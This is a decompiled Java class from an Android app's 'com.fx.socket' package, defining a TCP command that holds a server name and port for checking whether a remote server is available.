package com.fx.socket.command;

import com.fx.socket.TcpSocketCmd;

public class RemoteCheckTcpServerAvailable
  extends TcpSocketCmd
{
  private static String a;
  private static int b = 0;
  private static final long serialVersionUID = 356919155844146710L;
  
  public RemoteCheckTcpServerAvailable(String paramString, int paramInt)
  {
    super(null, Boolean.class);
    a = paramString;
    b = paramInt;
  }
  
  protected int getPort()
  {
    return b;
  }
  
  protected String getServerName()
  {
    return a;
  }
  
  protected String getTag()
  {
    return "RemoteCheckTcpServerAvailable";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/socket/command/RemoteCheckTcpServerAvailable.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */